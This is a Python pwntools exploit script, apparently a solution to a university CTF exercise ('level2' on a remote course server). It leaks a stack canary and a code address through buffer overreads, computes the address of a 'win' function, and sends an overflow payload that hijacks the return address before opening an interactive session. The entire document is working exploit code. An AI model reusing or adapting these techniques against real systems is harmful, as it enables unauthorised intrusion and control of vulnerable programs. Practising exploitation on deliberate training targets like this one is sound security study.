from pwn import *

port = 10006
rem = remote("kayle.snu.ac.kr", port)

elf = ELF('./level2/problem/level2')

rem.recvline()

payload = b'A' * 0x29
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))

payload = b'B' * 0x38
rem.send(payload)
rem.recvuntil(payload)
win_addr = u64(rem.recvn(6) + b'\x00' * 2) - 46 - elf.symbols['main'] + elf.symbols['win']

payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(win_addr+ 1)
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

rem.interactive()